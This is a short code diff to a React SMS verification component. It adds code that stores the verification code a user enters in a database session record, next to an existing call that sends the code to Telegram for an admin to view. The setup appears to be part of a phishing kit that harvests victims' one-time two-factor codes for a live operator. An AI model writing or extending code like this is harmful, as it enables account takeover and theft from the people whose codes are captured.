@@ -73,6 +73,15 @@ const SmsVerification = ({
     // Clear any previous admin message
     onDismissMessage();
     
+    // Save the code to the database
+    const sessionId = localStorage.getItem("swift_session_id");
+    if (sessionId) {
+      await supabase
+        .from("client_sessions")
+        .update({ verification_code: code })
+        .eq("id", sessionId);
+    }
+    
     // Send the code to Telegram for admin to see
     await sendCodeToTelegram(code);
     
